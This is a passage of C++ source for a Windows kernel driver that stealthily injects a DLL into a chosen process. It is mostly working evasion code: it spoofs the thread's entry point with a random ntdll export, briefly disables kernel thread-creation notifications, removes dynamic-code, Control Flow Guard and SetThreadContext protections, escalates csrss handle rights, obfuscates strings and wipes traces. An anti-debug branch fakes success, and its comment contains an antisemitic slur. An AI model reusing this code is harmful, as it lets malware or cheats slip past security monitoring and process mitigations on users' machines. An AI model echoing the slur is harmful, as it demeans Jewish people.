#include "injector.h"
#include "strings.h"
#include "vad.h"
#include "BlackBone/Loader.h"
#include "util.h"

extern "C"
{
	static
	BOOLEAN
	NTAPI
	HandleEnumerationCallback(
	#if NTDDI_VERSION > NTDDI_WIN7
		_In_ PHANDLE_TABLE HandleTable,
	#endif
		_Inout_ PHANDLE_TABLE_ENTRY HandleTableEntry,
		_In_ HANDLE Handle,
		_In_ PVOID EnumParameter
		);

	static
	NTSTATUS
	SetCSRSSWindowStation(
		_In_ PEPROCESS Process,
		_Out_ PBOOLEAN ProcessIsCsrss
		);
}

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, HandleEnumerationCallback)
#pragma alloc_text(PAGE, SetCSRSSWindowStation)
#pragma alloc_text(PAGE, StartDllThread)
#pragma alloc_text(PAGE, InjectDll)
#endif

// Initializer stub function:
// int NTAPI DllInitializer(PDLL_INIT_DATA InitData);
CONSTEXPR UCHAR DllInitializer64[] =
{
	// Wipe evidence of THREAD_CREATE_FLAGS_SUPPRESS_DLLMAINS: Teb.SameTebFlags &= ~SkipThreadAttach
	// UPDATE: LdrShutdownThread checks for this flag and may cause segfaults if it has been stripped.
	// Therefore you should reset the flag just before exiting the thread: NtCurrentTeb()->u3.s2.SkipThreadAttach = 1;
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,		// mov rax, gs:[30h]
	0xBE, 0xF7, 0xFF, 0x00, 0x00,								// mov esi, 0FFF7h
	0x66, 0x21, 0xB0, 0xEE, 0x17, 0x00, 0x00,					// and [rax+17EEh], si

	0x40, 0x53,						// push rbx
	0x48, 0x83, 0xEC, 0x20,			// sub rsp, 20h
	0x4C, 0x8B, 0x41, 0x18,			// mov r8, [rcx+18h]		// ULONG64 BaseAddress = InitData->ImageBase
	0x48, 0x8B, 0xD9,				// mov rbx, rcx
	0x8B, 0x51, 0x10,				// mov edx, [rcx+10h]		// ULONG EntryCount = InitData->EntryCount
	0x48, 0x8B, 0x49, 0x08,			// mov rcx, [rcx+8]			// PRUNTIME_FUNCTION FunctionTable = InitData->FunctionTable
	0x48, 0x85, 0xC9,				// test rcx, rcx			// Function table present?
	0x74, 0x02,						// jz +2					// If no, skip call
	0xFF, 0x13,						// call [rbx]				// call RtlAddFunctionTable to enable SEH
	0x48, 0x8B, 0x4B, 0x18,			// mov rcx, [rbx+18h]		// HINSTANCE Module = ImageBase = InitData->ImageBase
	0x45, 0x33, 0xC0,				// xor r8d, r8d				// PCONTEXT Reserved = nullptr
	0xBA, 0x01, 0x00, 0x00, 0x00,	// mov edx, 1				// ULONG FwdReason = DLL_PROCESS_ATTACH
	0x48, 0x8B, 0x43, 0x20,			// mov rax, [rbx+20h]
	0x48, 0x83, 0xC4, 0x20,			// add rsp, 20h
	0x5B,							// pop rbx
	0x48, 0xFF, 0xE0				// jmp rax					// Execute DllMain
};

CONSTEXPR UCHAR DllInitializer32[] =
{
	// Wipe evidence of THREAD_CREATE_FLAGS_SUPPRESS_DLLMAINS: Teb.SameTebFlags &= ~SkipThreadAttach
	// (See note above re: doing this)
	0x64, 0xA1, 0x18, 0x00, 0x00, 0x00,							// mov eax, fs:[18h]
	0xB9, 0xF7, 0xFF, 0x00, 0x00,								// mov ecx, 0FFF7h
	0x66, 0x21, 0x88, 0xCA, 0x0F, 0x00, 0x00,					// and [eax+0FCAh], cx

	0x8B, 0x44, 0x24, 0x04,			// mov eax, [esp+4h]
	0x6A, 0x00,						// push 0					// PCONTEXT Reserved = nullptr
	0x6A, 0x01,						// push 1					// ULONG FwdReason = DLL_PROCESS_ATTACH
	0xFF, 0x70, 0x18,				// push [eax+18h]			// HINSTANCE Module = InitData->ImageBase
	0xFF, 0x75, 0xF4,				// push [ebp-0Ch]			// Push new return value on stack since this code will be freed. NB: versions before 19H1 will push [ebp-8]
	0xFF, 0x60, 0x20				// jmp [eax+20h]			// Execute DllMain
};

// Data passed to the initializer stub. NB: all pointers are native (x64) size!
// Wow64 DLLs are passed the same struct with truncated pointers. This is because I'm lazy
typedef struct _DLL_INIT_DATA
{
	PVOID RtlAddFunctionTable;
	PRUNTIME_FUNCTION FunctionTable;
	ULONG EntryCount;
	PVOID ImageBase;
	PVOID EntryPoint;
	UCHAR InitFunction[sizeof(DllInitializer64)]; // For 32 bit DLLs the extra space will just be padded
} DLL_INIT_DATA, *PDLL_INIT_DATA;

// Context data passed to the handle table enumeration callback
typedef struct _ENUM_HANDLES_CONTEXT
{
	ULONG NormalAccessBits;		// Expected ACCESS_MASK value of the handle
	ULONG DesiredAccessBits;	// Desired (upgraded) ACCESS_MASK value of the handle
	HANDLE Handle;				// (set by callback) A handle whose access mask satisfies DesiredAccessBits
} ENUM_HANDLES_CONTEXT, *PENUM_HANDLES_CONTEXT;

extern ULONG MmProtectToValue[32];
extern DYNAMIC_DATA DynData;
extern t_NtCreateThreadEx NtCreateThreadEx;
extern t_NtResumeThread NtResumeThread;
extern t_NtTerminateThread NtTerminateThread;
extern t_NtProtectVirtualMemory NtProtectVirtualMemory;

PVOID RegionBase = nullptr, MappedPages = nullptr;
PMDL Mdl = nullptr;

static
NTSTATUS
AllocatePhysicalMemory(
	_In_ PVOID *RequestedBaseAddress,
	_In_ SIZE_T Size,
	_In_ ULONG Protection
	)
{
	PVOID BaseAddress = PAGE_ALIGN(*RequestedBaseAddress);
	*RequestedBaseAddress = nullptr;
	Size = ADDRESS_AND_SIZE_TO_SPAN_PAGES(BaseAddress, Size) << PAGE_SHIFT;

	// NB: the 'no execute' flags for ExAllocatePoolWithTag and MmMapLockedPagesSpecifyCache are only
	// to satisfy driver verifier. You can of course set the VAD protection to anything you want
	RegionBase = ExAllocatePoolWithTag(NonPagedPoolNx, Size, GetPoolTag());
	if (RegionBase == nullptr)
		return STATUS_NO_MEMORY;

	// Wipe kernel mode address before exposing it to user mode
	RtlZeroMemory(RegionBase, Size);

	Mdl = IoAllocateMdl(RegionBase, static_cast<ULONG>(Size), FALSE, FALSE, nullptr);
	if (Mdl == nullptr)
	{
		ExFreePool(RegionBase);
		return STATUS_NO_MEMORY;
	}

	MmBuildMdlForNonPagedPool(Mdl);

	__try
	{
		// Try mapping at the original base first
		*RequestedBaseAddress = MmMapLockedPagesSpecifyCache(Mdl,
															UserMode,
															MmCached,
															BaseAddress,
															FALSE,
															NormalPagePriority | MdlMappingNoExecute);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) { }

	if (*RequestedBaseAddress == nullptr)
	{
		__try
		{
			// Failure - try any address
			*RequestedBaseAddress = MmMapLockedPagesSpecifyCache(Mdl,
																UserMode,
																MmCached,
																nullptr,
																FALSE,
																NormalPagePriority | MdlMappingNoExecute);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) { }
	}

	if (*RequestedBaseAddress == nullptr)
	{
		// Failure
		IoFreeMdl(Mdl);
		ExFreePool(RegionBase);
		return STATUS_NONE_MAPPED;
	}

	// Set initial VAD protection
	MappedPages = *RequestedBaseAddress;
	const ULONG_PTR FinalBaseAddress = reinterpret_cast<ULONG_PTR>(MappedPages);
	ProtectVAD(PsGetCurrentProcess(), FinalBaseAddress, MmProtectToValue[Protection]);

	// Make pages executable if requested
	if ((Protection & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) != 0)
	{
		for (ULONG_PTR pAddress = FinalBaseAddress; pAddress < FinalBaseAddress + Size; pAddress += PAGE_SIZE)
		{
			GetPTEForVA(reinterpret_cast<PVOID>(pAddress))->u.Hard.NoExecute = 0;
		}
	}

	return STATUS_SUCCESS;
}

static
BOOLEAN
HandleEnumerationCallback(
#if NTDDI_VERSION > NTDDI_WIN7
	_In_ PHANDLE_TABLE HandleTable,
#endif
	_Inout_ PHANDLE_TABLE_ENTRY HandleTableEntry,
	_In_ HANDLE Handle,
	_In_ PVOID EnumParameter
	)
{
	PAGED_CODE();

	const PENUM_HANDLES_CONTEXT Context = static_cast<PENUM_HANDLES_CONTEXT>(EnumParameter);
	BOOLEAN Result = FALSE;

	// First check if we already have a handle with the desired access mask (possible if the driver has previously run)
	if (HandleTableEntry->GrantedAccessBits == Context->DesiredAccessBits)
	{
		Context->Handle = Handle;
		Result = TRUE;
	}
	// If not, see if this is a handle we can upgrade the access mask of
	else if (HandleTableEntry->GrantedAccessBits == Context->NormalAccessBits)
	{
		HandleTableEntry->GrantedAccessBits = Context->DesiredAccessBits;
		Printf("Upgraded access mask of handle %02X from 0x%04X to 0x%04X.\n",
			HandleToULong(Handle), Context->NormalAccessBits, Context->DesiredAccessBits);

		Context->Handle = Handle;
		Result = TRUE;
	}

#if NTDDI_VERSION > NTDDI_WIN7
	// Release implicit locks
	_InterlockedExchangeAdd8(reinterpret_cast<PCHAR>(&HandleTableEntry->VolatileLowValue), 1); // Set Unlocked flag to 1
	if (HandleTable != nullptr && HandleTable->HandleContentionEvent != 0)
		ExfUnblockPushLock(&HandleTable->HandleContentionEvent, nullptr);
#endif

	return Result;
}

static
NTSTATUS
SetCSRSSWindowStation(
	_In_ PEPROCESS Process,
	_Out_ PBOOLEAN ProcessIsCsrss
	)
{
	PAGED_CODE();

	*ProcessIsCsrss = FALSE;

	// If the process isn't csrss.exe, we don't need to do anything
	const PCHAR ProcessFileName = PsGetProcessImageFileName(Process);
	if (ProcessFileName == nullptr ||
		ProcessFileName[0] != 'c' || ProcessFileName[1] != 's' || ProcessFileName[2] != 'r' ||
		ProcessFileName[3] != 's' || ProcessFileName[4] != 's' || ProcessFileName[5] != '.' ||
		ProcessFileName[6] != 'e' || ProcessFileName[7] != 'x' || ProcessFileName[8] != 'e')
		return STATUS_SUCCESS;

	*ProcessIsCsrss = TRUE;

	// Acquire process exit synchronization and reference the handle table
	const NTSTATUS Status = PsAcquireProcessExitSynchronization(Process);
	if (!NT_SUCCESS(Status))
		return Status;
	const PHANDLE_TABLE HandleTable = *reinterpret_cast<PHANDLE_TABLE*>(reinterpret_cast<PUCHAR>(Process) +
		DynData.ObjectTableOffset);
	if (HandleTable == nullptr)
	{
		PsReleaseProcessExitSynchronization(Process);
		return STATUS_NOT_FOUND;
	}

	// Set up the enumeration context with the regular access mask of CSRSS's WinSta0 handle and the one we want
	ENUM_HANDLES_CONTEXT Context;
	Context.NormalAccessBits = (READ_CONTROL | DELETE | WRITE_DAC | WRITE_OWNER |
								0x1 /*WINSTA_ENUMDESKTOPS*/ | 0x2 /*WINSTA_READATTRIBUTES*/);	// 0xF0003
	Context.DesiredAccessBits = (READ_CONTROL | DELETE | WRITE_DAC | WRITE_OWNER |
								0x37F /*WINSTA_ALL_ACCESS*/);									// 0xF037F
	Context.Handle = nullptr;

	// Enumerate the handle table. The callback will upgrade the access mask if needed and set the handle value
	const BOOLEAN Found = ExEnumHandleTable(HandleTable,
										reinterpret_cast<PEX_ENUM_HANDLE_CALLBACK>(HandleEnumerationCallback),
										&Context,
										nullptr);

	PsReleaseProcessExitSynchronization(Process);

	if (!Found)
	{
		Printf("Could not find a useable window station handle in the CSRSS process handle table.\n");
		return STATUS_NOT_FOUND;
	}

	// We now have a window station handle with WINSTA_ALL_ACCESS. We could call PsSetProcessWindowStation with this handle,
	// but apparently this is not equivalent (sufficient) compared to calling user32!SetProcessWindowStation from user mode.
	// We could call the function here using the shadow SSDT, but this would require the call to be made from an APC (KeStackAttackProcess is not enough).
	// Therefore the user mode DLL still has to enumerate the process handles to get the WinSta0 handle, call SetProcessWindowStation(hWinsta)
	// and then hDesktop = OpenDesktop(L"Default", 0, FALSE, GENERIC_ALL) followed by SetThreadDesktop(hDesktop). However it's no longer necessary
	// to call OpenWindowStation (which creates a duplicate and uncloseable handle on every call) since the above handle can now be reused.
	return STATUS_SUCCESS;
}

VOID
GetThreadStartName(
	_Out_ PANSI_STRING ThreadStartName
	)
{
	RtlZeroMemory(ThreadStartName->Buffer, ThreadStartName->MaximumLength);
	ThreadStartName->Length = 0;

	CONSTEXPR const ULONG NumThreadStartNames = 8; // Hardcoded because good luck trying to fit templated structs in an array
	const ULONG Index = RtlNextRandom(0, NumThreadStartNames);
	NT_ASSERT(Index <= NumThreadStartNames - 1);

	switch (Index)
	{
		case 0:
		{
			DecryptString(EncryptedEtwpCreateEtwThreadString, ThreadStartName->Buffer);
			ThreadStartName->Length = decltype(EncryptedEtwpCreateEtwThreadString)::Length - sizeof(CHAR);
			break;
		}
		case 1:
		{
			DecryptString(EncryptedRtlActivateActivationContextExString, ThreadStartName->Buffer);
			ThreadStartName->Length = decltype(EncryptedRtlActivateActivationContextExString)::Length - sizeof(CHAR);
			break;
		}
		case 2:
		{
			DecryptString(EncryptedRtlCreateActivationContextString, ThreadStartName->Buffer);
			ThreadStartName->Length = decltype(EncryptedRtlCreateActivationContextString)::Length - sizeof(CHAR);
			break;
		}
		case 3:
		{
			DecryptString(EncryptedRtlQueryActivationContextApplicationSettingsString, ThreadStartName->Buffer);
			ThreadStartName->Length = decltype(EncryptedRtlQueryActivationContextApplicationSettingsString)::Length - sizeof(CHAR);
			break;
		}
		case 4:
		{
			DecryptString(EncryptedRtlValidateHeapString, ThreadStartName->Buffer);
			ThreadStartName->Length = decltype(EncryptedRtlValidateHeapString)::Length - sizeof(CHAR);
			break;
		}
		case 5:
		{
			DecryptString(EncryptedTpStartAsyncIoOperationString, ThreadStartName->Buffer);
			ThreadStartName->Length = decltype(EncryptedTpStartAsyncIoOperationString)::Length - sizeof(CHAR);
			break;
		}
		case 6:
		{
			DecryptString(EncryptedTpWaitForWorkString, ThreadStartName->Buffer);
			ThreadStartName->Length = decltype(EncryptedTpWaitForWorkString)::Length - sizeof(CHAR);
			break;
		}
		case 7:
		{
			DecryptString(EncryptedWinSqmEventWriteString, ThreadStartName->Buffer);
			ThreadStartName->Length = decltype(EncryptedWinSqmEventWriteString)::Length - sizeof(CHAR);
			break;
		}
		default:
			NT_ASSERT(FALSE);
			break;
	}
}

NTSTATUS
StartDllThread(
	_In_ PVOID ImageBase,
	_In_ ULONG EntryPointRva,
	_In_ BOOLEAN IsWow64
	)
{
	PAGED_CODE();

	PDLL_INIT_DATA DllInitData = nullptr;
	SIZE_T DllInitDataSize = sizeof(*DllInitData);
	PCONTEXT Context = nullptr;
	NTSTATUS Status;

	// Find the exception directory if present
	ULONG FunctionTableSize = 0;
	const PIMAGE_RUNTIME_FUNCTION_ENTRY ExceptionDirectory = !IsWow64 ? static_cast<PIMAGE_RUNTIME_FUNCTION_ENTRY>(
		RtlpImageDirectoryEntryToDataEx(ImageBase,
										TRUE,
										IMAGE_DIRECTORY_ENTRY_EXCEPTION,
										&FunctionTableSize))
		: nullptr;

	// Find ntdll.dll. NB: this will be the 32 bit ntdll for Wow64 processes
	WCHAR NtdllNameBuffer[decltype(EncryptedNtdllString)::Length];
	DecryptString(EncryptedNtdllString, NtdllNameBuffer);
	UNICODE_STRING NtdllName = { decltype(EncryptedNtdllString)::Length - sizeof(WCHAR), decltype(EncryptedNtdllString)::Length, NtdllNameBuffer };
	const PVOID Ntdll = FindModule(PsGetCurrentProcess(), &NtdllName);

	// Find RtlAddFunctionTable, needed to enable SEH support for dynamic code on x64
	CHAR RtlAddFunctionTableName[decltype(EncryptedRtlAddFunctionTableString)::Length];
	DecryptString(EncryptedRtlAddFunctionTableString, RtlAddFunctionTableName);
	const PVOID RtlAddFunctionTable = !IsWow64
									? GetModuleExport(Ntdll,
										RtlAddFunctionTableName,
										PsGetCurrentProcess())
									: nullptr;

	// Get a nice plausible sounding random ntdll export which will be our thread 'entry point'
	CHAR ThreadStartNameBuffer[128];
	ANSI_STRING ThreadStartName = { 0, sizeof(ThreadStartNameBuffer), ThreadStartNameBuffer };
	GetThreadStartName(&ThreadStartName);
	const PVOID ThreadStartRoutine = GetModuleExport(Ntdll,
													ThreadStartName.Buffer,
													PsGetCurrentProcess());

	// Wipe string buffers and validate the function pointers
	RtlSecureZeroMemory(NtdllNameBuffer, decltype(EncryptedNtdllString)::Length);
	RtlSecureZeroMemory(RtlAddFunctionTableName, decltype(EncryptedRtlAddFunctionTableString)::Length);
	if ((!IsWow64 && RtlAddFunctionTable == nullptr) || ThreadStartRoutine == nullptr)
	{
		Printf("Failed to find required ntdll.dll exports RtlAddFunctionTable and/or %Z.\n", &ThreadStartName);
		Status = STATUS_PROCEDURE_NOT_FOUND;
		goto finished;
	}

	// Allocate temporary memory from which our initializer stub will run
	Status = NtAllocateVirtualMemory(NtCurrentProcess(),
									reinterpret_cast<PVOID*>(&DllInitData),
									0,
									&DllInitDataSize,
									MEM_COMMIT | MEM_RESERVE,
									PAGE_READWRITE); // Note: not RWX! This upsets processes that prohibit dynamic code execution
	if (!NT_SUCCESS(Status))
	{
		Printf("NtAllocateVirtualMemory (DLL init data): %08X\n", Status);
		goto finished;
	}

	// Allocate space for a CONTEXT struct. This needs to be in user mode space for PsGet/SetContextThread to work
	SIZE_T ContextSize = IsWow64 ? sizeof(WOW64_CONTEXT) : sizeof(CONTEXT);
	Status = NtAllocateVirtualMemory(NtCurrentProcess(),
									reinterpret_cast<PVOID*>(&Context),
									0,
									&ContextSize,
									MEM_COMMIT | MEM_RESERVE,
									PAGE_READWRITE);
	if (!NT_SUCCESS(Status))
	{
		Printf("NtAllocateVirtualMemory (context): %08X\n", Status);
		goto finished;
	}

	// Write data for the initializer stub function
	DllInitData->RtlAddFunctionTable = RtlAddFunctionTable;
	DllInitData->FunctionTable = reinterpret_cast<PRUNTIME_FUNCTION>(ExceptionDirectory);
	DllInitData->EntryCount = FunctionTableSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
	DllInitData->ImageBase = ImageBase;
	DllInitData->EntryPoint = static_cast<PUCHAR>(ImageBase) + EntryPointRva;
	RtlCopyMemory(DllInitData->InitFunction, IsWow64 ? DllInitializer32 : DllInitializer64,
		IsWow64 ? sizeof(DllInitializer32) : sizeof(DllInitializer64));

	if (IsWow64)
	{
		// Workaround for the layout of the WOW64 version of kernel32!BaseThreadInitThunk changing in Windows 10 19H1
		NT_ASSERT(DllInitData->InitFunction[31] == 0xF4); // '0Ch' in 'push [ebp-0Ch]'. This is the 19H1 value and the default
		if (DynData.Version < WINVER_10_19H1)
		{
			DllInitData->InitFunction[31] = 0xF8; // '8h' in 'push [ebp-8h]'
		}
	}

	// Now make the page executable (only) since we are done writing to it
	ULONG OldProtect;
	Status = NtProtectVirtualMemory(NtCurrentProcess(),
									reinterpret_cast<PVOID*>(&DllInitData),
									&DllInitDataSize,
									PAGE_EXECUTE,
									&OldProtect);
	if (!NT_SUCCESS(Status))
	{
		Printf("NtProtectVirtualMemory: %08X\n", Status);
		goto finished;
	}

	// Set up the PS_ATTRIBUTE_LIST for receiving the client ID from NtCreateThreadEx
	constexpr SIZE_T NumAttributes = 1;
	constexpr SIZE_T AttributesSize = sizeof(SIZE_T) + NumAttributes * sizeof(PS_ATTRIBUTE);
	PS_ATTRIBUTE_LIST AttributeList;
	RtlZeroMemory(&AttributeList, AttributesSize);
	AttributeList.TotalLength = AttributesSize;

	CLIENT_ID ClientId;
	RtlZeroMemory(&ClientId, sizeof(ClientId));
	AttributeList.Attributes[0].Attribute = PS_ATTRIBUTE_CLIENT_ID;
	AttributeList.Attributes[0].Size = sizeof(ClientId);
	AttributeList.Attributes[0].Value = reinterpret_cast<ULONG_PTR>(&ClientId);

	// Create a suspended thread with <bullshit ntdll function> as the 'entry point'. This is what will
	// be seen by PsSetCreateThreadNotifyRoutine subscribers, and shown in e.g. Process Explorer
	Printf("Creating thread with fake entry point 0x%p (ntdll!%Z).\n", ThreadStartRoutine, &ThreadStartName);
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes,
								nullptr,
								IsWow64 ? 0 : OBJ_KERNEL_HANDLE, // Wow64 thread context setting forbids kernel handles
								nullptr,
								nullptr);

	// Disable PspNotifyEnableMask to prevent thread create notifications
	const ULONG PspNotifyEnableMask = *DynData.pPspNotifyEnableMask;
	*DynData.pPspNotifyEnableMask = 0;

	HANDLE ThreadHandle;
	Status = NtCreateThreadEx(&ThreadHandle,
							THREAD_ALL_ACCESS,
							&ObjectAttributes,
							NtCurrentProcess(),
							reinterpret_cast<PUSER_THREAD_START_ROUTINE>(ThreadStartRoutine),
							DllInitData,
							THREAD_CREATE_FLAGS_CREATE_SUSPENDED |
							(DynData.Version <= WINVER_7_SP1 ? 0 : THREAD_CREATE_FLAGS_SUPPRESS_DLLMAINS), // Windows 7 does not like this flag (apparently on a per DLL basis)
							0,
							0,
							0,
							&AttributeList);

	// Restore PspNotifyEnableMask to its original value
	*DynData.pPspNotifyEnableMask |= PspNotifyEnableMask;

	if (!NT_SUCCESS(Status))
	{
		Printf("NtCreateThreadEx: %08X\n", Status);
		goto finished;
	}

	// Now that we have a thread ID, we can finally initialize the stack cookie
	InitializeStackCookie(ImageBase, &ClientId);

	if (IsWow64)
	{
		// For Wow64 we have to drop previous mode to user mode like dirty peasants, because
		// otherwise we will be modifying the thread's kernel trap frame which is NOT a good idea
		const KPROCESSOR_MODE PreviousMode = KeSetPreviousMode(UserMode);
		PWOW64_CONTEXT Wow64Context = reinterpret_cast<PWOW64_CONTEXT>(Context);
		RtlZeroMemory(Wow64Context, sizeof(*Wow64Context));
		Wow64Context->ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;

		Status = NtQueryInformationThread(ThreadHandle, // Note: Nt, not Zw!
										ThreadWow64Context,
										Wow64Context,
										sizeof(*Wow64Context),
										nullptr);
		if (NT_SUCCESS(Status))
		{
			// Change the entry point to InitFunction, which will transfer execution to DllMain
			Wow64Context->Eax = static_cast<ULONG>(reinterpret_cast<ULONG_PTR>(static_cast<PVOID>(DllInitData->InitFunction)));

			Status = NtSetInformationThread(ThreadHandle, // Note: Nt, not Zw!
											ThreadWow64Context,
											Wow64Context,
											sizeof(*Wow64Context));
			if (NT_SUCCESS(Status))
				Printf("Updated WOW64 thread context. Entry point: 0x%p, DllMain: 0x%p.\n",
					reinterpret_cast<PVOID>(DllInitData->InitFunction), DllInitData->EntryPoint);
		}

		// Restore previous mode to kernel. Phew
		KeSetPreviousMode(PreviousMode);
	}
	else
	{
		// Get the ETHREAD
		PETHREAD Thread = nullptr;
		Status = ObReferenceObjectByHandleWithTag(ThreadHandle,
												THREAD_ALL_ACCESS,
												*PsThreadType,
												KernelMode,
												GetPoolTag(),
												reinterpret_cast<PVOID*>(&Thread),
												nullptr);
		if (NT_SUCCESS(Status))
		{
			RtlZeroMemory(Context, sizeof(*Context));
			Context->ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;

			// Get thread context
			Status = PsGetContextThread(Thread, Context, UserMode);
			if (NT_SUCCESS(Status))
			{
				// Change the entry point to InitFunction, which will transfer execution to DllMain after enabling SEH
#ifdef _M_AMD64
				Context->Rcx = reinterpret_cast<ULONG64>(static_cast<PVOID>(DllInitData->InitFunction));
#else
				Context->Eax = static_cast<ULONG>(reinterpret_cast<ULONG64>(static_cast<PVOID>(DllInitData->InitFunction)));
#endif

				Status = PsSetContextThread(Thread, Context, UserMode);
				if (NT_SUCCESS(Status))
					Printf("Updated thread context. Entry point: 0x%p, DllMain: 0x%p.\n",
						reinterpret_cast<PVOID>(DllInitData->InitFunction), DllInitData->EntryPoint);
			}
			ObfDereferenceObject(Thread);
		}
	}

	if (!NT_SUCCESS(Status))
	{
		// If any of the above failed, terminate the thread
		Printf("Failed to set %s thread context: %08X\n", IsWow64 ? "WOW64" : "", Status);
		NtTerminateThread(ThreadHandle, Status);
		Printf("Thread terminated.\n");
	}
	else
	{
		// Success - resume execution
		NtResumeThread(ThreadHandle, nullptr);
		Printf("Thread resumed.\n");
	}

	ObCloseHandle(ThreadHandle, static_cast<KPROCESSOR_MODE>(IsWow64 ? UserMode : KernelMode));

	// We have no synchronization mechanism, but the assembly stub is extremely trivial, so 250ms is plenty.
	// (even that is overkill, but it leaves some headroom for RtlAddFunctionTable for very large images)
	RtlSleep(250);

	// It's possible the process died in the time period the DLL has been running (probably because it crashed).
	// Because we are still attached to the process, it's not truly gone yet, but all user space addresses will be.
	__try
	{
		ProbeForWrite(ImageBase, sizeof(PVOID), alignof(PVOID));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		Printf("Process died! Returning immediately without cleanup.\n");
		return STATUS_PROCESS_IS_TERMINATING;
	}

finished:
	// Wipe and free the memory used for the thread context and initializer data
	if (Context != nullptr)
	{
		RtlFillGarbageMemory(Context, sizeof(*Context));
		ContextSize = 0;
		NtFreeVirtualMemory(NtCurrentProcess(),
							reinterpret_cast<PVOID*>(&Context),
							&ContextSize,
							MEM_RELEASE);
	}
	if (DllInitData != nullptr)
	{
		// RWX is verboten, so we have to revert from PAGE_EXECUTE back to R/W again just to wipe the DLL init stub bytes
		if (NT_SUCCESS(NtProtectVirtualMemory(NtCurrentProcess(),
											reinterpret_cast<PVOID*>(&DllInitData),
											&DllInitDataSize,
											PAGE_READWRITE,
											&OldProtect)))
		{
			RtlFillGarbageMemory(DllInitData, sizeof(*DllInitData));
		}
		DllInitDataSize = 0;
		NtFreeVirtualMemory(NtCurrentProcess(),
							reinterpret_cast<PVOID*>(&DllInitData),
							&DllInitDataSize,
							MEM_RELEASE);
	}

	return Status;
}

NTSTATUS
InjectDll(
	_In_opt_ ULONG ProcessId,
	_In_opt_ PUNICODE_STRING ProcessName,
	_In_opt_ BOOLEAN WaitForNamedProcess,
	_In_ PUNICODE_STRING DllNtPath,
	_In_ BOOLEAN DeleteDll,
	_In_ BOOLEAN WipeImageHeaders
	)
{
	PAGED_CODE();
	
	PEPROCESS Process = nullptr;
	PEPROCESS_FLAGS2 Flags2 = nullptr;
	PEPROCESS_MITIGATION_FLAGS MitigationFlags = nullptr;
	UCHAR DisableDynamicCode = 0, RestrictSetThreadContext = 0;
	NTSTATUS Status;

	if (ProcessId != 0)
	{
		// Open the process by PID
		Printf("Opening process with PID %u...\n", ProcessId);
		Status = PsLookupProcessByProcessId(ULongToHandle(ProcessId), &Process);
	}
	else
	{
		// Open the process by name
		Printf("Opening process %wZ...\n", ProcessName);
		Status = OpenSessionProcess(&Process,
									ProcessName,
									1,
									WaitForNamedProcess);
	}

	if (!NT_SUCCESS(Status))
	{
		if (Status == STATUS_INVALID_CID)
			Printf("Process with PID %u not found.\n", ProcessId);
		else if (Status != STATUS_CANCELLED) // Don't complain here if the user chose to unload the driver themselves
			Printf("%s error %08X\n", (ProcessId != 0 ? "PsLookupProcessByProcessId" : "OpenSessionProcess"), Status);
		return Status;
	}
	else
		Printf("Process with PID %u found.\n", Process);

	if (Process != nullptr && PsGetProcessDebugPort(Process) != nullptr)
	{
		// The process is being debugged. That means some jew dumped this driver and is testing it in its lab. Time to get out
		Printf("If you're reading this message, it means you're an idiot and got defeated by your own anti-debug check. Recompile and try again\n");
		ObfDereferenceObject(Process);
		return STATUS_SUCCESS; // Heh heh... totally successful guys! All done here! No need to investigate further, this driver isn't interesting
	}

#ifdef _M_AMD64
	// Check if it's WoW64
	const BOOLEAN IsWow64 = PsGetProcessWow64Process(Process) != nullptr;
#else
	constexpr const BOOLEAN IsWow64 = FALSE;
#endif

	if (DynData.Version >= WINVER_81)
	{
		UCHAR CfgEnabled;
		Flags2 = reinterpret_cast<PEPROCESS_FLAGS2>(reinterpret_cast<PUCHAR>(Process) + DynData.EProcessFlags2Offset);
		if (DynData.Version <= WINVER_10_RS2)
		{
			CONST PEPROCESS_FLAGS Flags = reinterpret_cast<PEPROCESS_FLAGS>(reinterpret_cast<PUCHAR>(Process) + DynData.EProcessFlagsOffset);
			CfgEnabled = Flags->ControlFlowGuardEnabled;
			DisableDynamicCode = Flags2->DisableDynamicCode;
		}
		else
		{
			// Win 10 RS3+
			MitigationFlags = reinterpret_cast<PEPROCESS_MITIGATION_FLAGS>(reinterpret_cast<PUCHAR>(Process) + DynData.MitigationFlagsOffset);
			CfgEnabled = MitigationFlags->ControlFlowGuardEnabled;
			DisableDynamicCode = MitigationFlags->DisableDynamicCode;

			if (DynData.Version >= WINVER_10_RS4)
			{
				// Win 10 RS4+
				RestrictSetThreadContext = reinterpret_cast<PEPROCESS_FLAGS2_RS4_PLUS>(Flags2)->RestrictSetThreadContext;
			}
		}

		Printf("Process prohibits dynamic code execution? %s\n", DisableDynamicCode ? "YES. Removing..." : "no");
		if (DisableDynamicCode)
		{
			// Note: this restriction, while liftable, only seems to apply when you explicitly specify a base address to
			// ZwAllocateVirtualMemory. If you specify null and let it choose the base, you are free to allocate and protect
			// these pages as executable. Possibly this is an oversight as it's not very hard to relocate an image
			if (DynData.Version <= WINVER_10_RS2)
				Flags2->DisableDynamicCode = 0;
			else
				MitigationFlags->DisableDynamicCode = 0;
			Printf("\tRestriction removed.\n");
		}

		Printf("Process has Control Flow Guard? %s\n", CfgEnabled ? "YES. Patching..." : "no");
		if (CfgEnabled)
		{
			Status = PatchGuardCFCheckFunctionPointers(Process);
			Printf("%s\n", (NT_SUCCESS(Status)
				? "\tSuccesfully patched CFG guard check pointers."
				: "\tError: failed to patch CFG guard check pointers."));
			if (!NT_SUCCESS(Status))
				return Status;
		}
		
		Printf("Process restricts SetThreadContext? %s\n", RestrictSetThreadContext ? "YES. Handling it..." : "no");
		if (RestrictSetThreadContext)
		{
			// This should be pretty straightforward, but give a warning anyway because I couldn't find any way to test this
			reinterpret_cast<PEPROCESS_FLAGS2_RS4_PLUS>(Flags2)->RestrictSetThreadContext = 0;
			Printf("\tRestriction removed. Note that (un)setting RestrictSetThreadContext is *untested* because there is currently no documented interface and even system processes do not use it\n");
		}
	}

	bool Attached = false;
	Printf("Injecting %ls...\n", DllNtPath->Buffer + 4);

	// Read the (possibly encrypted) DLL into memory
